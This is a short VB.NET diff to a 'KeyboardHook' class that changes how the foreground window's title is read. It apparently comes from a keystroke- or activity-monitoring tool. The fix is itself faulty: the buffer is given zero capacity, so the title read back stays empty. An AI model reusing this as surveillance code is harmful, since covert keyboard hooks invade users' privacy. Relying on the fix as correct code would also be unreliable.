@@ -56,7 +56,7 @@ Public Class KeyboardHook
     Private Function GetForegroundInfo()
         Dim hWnd As IntPtr = GetForegroundWindow()
         Dim length As Integer
-        Dim wTitle As StringBuilder
+        Dim wTitle As StringBuilder = New System.Text.StringBuilder("", 0)
 
         If hWnd <> IntPtr.Zero Then
             length = GetWindowTextLength(hWnd)
@@ -64,8 +64,8 @@ Public Class KeyboardHook
             If length > 0 Then
                 GetWindowText(hWnd, wTitle, wTitle.Capacity)
             End If
-            Return wTitle.ToString
         End If
+        Return wTitle.ToString
     End Function
     'Numero de Proceso'
     Private Function GetProcessID()
